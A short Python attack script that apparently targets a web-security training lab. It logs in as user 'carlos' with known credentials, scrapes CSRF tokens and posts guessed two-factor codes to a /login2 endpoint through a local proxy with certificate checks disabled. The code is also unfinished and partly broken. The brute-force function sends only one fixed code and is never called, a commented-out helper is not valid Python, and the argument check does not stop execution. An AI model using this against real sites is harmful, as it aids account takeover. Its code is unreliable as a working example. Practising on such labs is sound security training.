import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

#def 2fa(code):
 #   if len(code) < 5:
 #       code = code + 1
  #      return code
   # else:
    #    return("Exhausted all code combinations")

def brute_force(s, url):
    login_path = "/login2"
    csrf_token = get_csrf_token(s,url)
    print(csrf_token)
    data = {'csrf': csrf_token, 'mfa-code': '1234'}
    res2 = s.post(url + login_path, data=data, verify=False, proxies=proxies)
    return res2.status_code

def get_csrf_token(s, url):
    login_path = "/login"
    r = s.get(url + login_path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def login(s, url):
    login_path = "/login"
    csrf_token = get_csrf_token(s, url)
    print(csrf_token)
    data = {'csrf': csrf_token, 'username': 'carlos', 'password': 'montoya'}
    res = s.post(url + login_path, data=data, verify=False, proxies=proxies)
    print(res.status_code)
    return res.status_code

def main():
    if len(sys.argv) != 2:
        print("incorrect format")
    url = sys.argv[1]
    print("Logging in user")
    s = requests.Session()
    login(s, url)

if __name__ == "__main__":
    main()
